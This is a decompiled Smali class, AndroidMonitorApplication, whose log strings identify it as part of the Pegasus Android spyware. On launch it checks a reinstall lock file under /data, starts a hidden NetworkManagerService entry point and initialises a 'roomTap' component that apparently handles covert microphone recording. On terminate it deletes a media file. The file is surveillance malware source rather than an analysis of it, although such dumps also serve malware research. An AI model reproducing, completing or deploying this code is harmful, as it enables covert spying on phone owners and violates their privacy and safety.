.class public abstract Lcom/network/android/android/monitor/AndroidMonitorApplication;
.super Landroid/app/Application;


# instance fields
.field private a:Lcom/network/e/a/b;

.field private b:Landroid/content/BroadcastReceiver;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Application;-><init>()V

    return-void
.end method

.method static synthetic a(Lcom/network/android/android/monitor/AndroidMonitorApplication;)Lcom/network/e/a/b;
    .locals 1

    iget-object v0, p0, Lcom/network/android/android/monitor/AndroidMonitorApplication;->a:Lcom/network/e/a/b;

    return-object v0
.end method


# virtual methods
.method protected abstract a(Landroid/content/IntentFilter;)V
.end method

.method protected final a(Lcom/network/android/monitor/observer/r;Landroid/content/IntentFilter;)V
    .locals 5

    iget-object v0, p0, Lcom/network/android/android/monitor/AndroidMonitorApplication;->a:Lcom/network/e/a/b;

    invoke-virtual {v0, p1}, Lcom/network/e/a/b;->a(Lcom/network/android/monitor/a/b;)V

    new-instance v1, Lcom/network/e/a/a;

    const/4 v0, 0x0

    invoke-direct {v1, p0, p0, v0}, Lcom/network/e/a/a;-><init>(Ljava/lang/Object;Landroid/content/Context;Landroid/content/Intent;)V

    invoke-virtual {p1}, Lcom/network/android/monitor/observer/r;->a()[Ljava/lang/String;

    move-result-object v2

    array-length v3, v2

    const/4 v0, 0x0

    :goto_0
    if-ge v0, v3, :cond_0

    aget-object v4, v2, v0

    invoke-virtual {p2, v4}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    invoke-virtual {p1, v1}, Lcom/network/android/monitor/observer/r;->a(Lcom/network/android/monitor/a/a;)V

    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_0
    return-void
.end method

.method public final c()Lcom/network/e/a/b;
    .locals 1

    iget-object v0, p0, Lcom/network/android/android/monitor/AndroidMonitorApplication;->a:Lcom/network/e/a/b;

    return-object v0
.end method

.method public onCreate()V
    .locals 4

    invoke-super {p0}, Landroid/app/Application;->onCreate()V

    const-string v0, "AndroidMonitorApplication: Android Monitor Application Create"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :try_start_0
    const-string v0, "performIfAgentWasInstalledInOvverideCheck starting"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v0, Ljava/io/File;

    const-string v1, "/data/reinslock"

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->length()J

    move-result-wide v0

    const-wide/16 v2, 0x0

    cmp-long v0, v0, v2

    if-lez v0, :cond_0

    const-string v0, "NetworkManagerService  found reinstall sync file. that mean we were installed by reinstall"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v0, Ljava/io/File;

    const-string v1, "/data/data/com.network.android"

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    const-string v1, "/data/reinslock"

    invoke-static {v1}, Lcom/network/h/b;->b(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/network/h/b;->a(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->mkdir()Z

    const/4 v0, 0x1

    const/16 v1, 0x62

    const-string v2, "LOG_AGENT_WAS_INTALLED__BY_OVVERIDE"

    invoke-static {v0, v1, v2}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;)V

    :cond_0
    const-string v0, "performIfAgentWasInstalledInOvverideCheck end"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    new-instance v0, Lcom/network/e/a/b;

    invoke-direct {v0}, Lcom/network/e/a/b;-><init>()V

    iput-object v0, p0, Lcom/network/android/android/monitor/AndroidMonitorApplication;->a:Lcom/network/e/a/b;

    new-instance v0, Landroid/content/IntentFilter;

    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V

    iget-object v1, p0, Lcom/network/android/android/monitor/AndroidMonitorApplication;->a:Lcom/network/e/a/b;

    invoke-virtual {p0, v0}, Lcom/network/android/android/monitor/AndroidMonitorApplication;->a(Landroid/content/IntentFilter;)V

    new-instance v1, Lcom/network/android/android/monitor/a;

    invoke-direct {v1, p0}, Lcom/network/android/android/monitor/a;-><init>(Lcom/network/android/android/monitor/AndroidMonitorApplication;)V

    iput-object v1, p0, Lcom/network/android/android/monitor/AndroidMonitorApplication;->b:Landroid/content/BroadcastReceiver;

    iget-object v1, p0, Lcom/network/android/android/monitor/AndroidMonitorApplication;->b:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v1, v0}, Lcom/network/android/android/monitor/AndroidMonitorApplication;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "AndroidMonitorApplication Build.VERSION.SDK_INT:"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Lcom/network/android/a/c;->d()Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "AndroidMonitorApplication: startService ACTION_ENTRY_POINT"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/network/android/android/monitor/NetworkManagerService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "ACTION_ENTRY_POINT"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/network/android/android/monitor/AndroidMonitorApplication;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :goto_1
    invoke-static {p0}, Lcom/network/android/roomTap/k;->a(Landroid/content/Context;)V

    const-string v0, "AndroidMonitorApplication: Pegasus Android Monitor Application Initialized Successfully!"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "performIfAgentWasInstalledInOvverideCheck  exception"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0

    :cond_1
    const-string v0, "AndroidMonitorApplication: 4.3 JELLY_BEAN_MR2. working without the service "

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    goto :goto_1
.end method

.method public onTerminate()V
    .locals 2

    invoke-super {p0}, Landroid/app/Application;->onTerminate()V

    iget-object v0, p0, Lcom/network/android/android/monitor/AndroidMonitorApplication;->a:Lcom/network/e/a/b;

    invoke-virtual {v0}, Lcom/network/e/a/b;->a()V

    iget-object v0, p0, Lcom/network/android/android/monitor/AndroidMonitorApplication;->b:Landroid/content/BroadcastReceiver;

    invoke-virtual {p0, v0}, Lcom/network/android/android/monitor/AndroidMonitorApplication;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    invoke-static {}, Lcom/network/android/roomTap/k;->a()V

    new-instance v0, Ljava/io/File;

    invoke-static {}, Lcom/network/media/r;->a()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->delete()Z

    const-string v0, "AndroidMonitorApplication: onTerminate"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    return-void
.end method
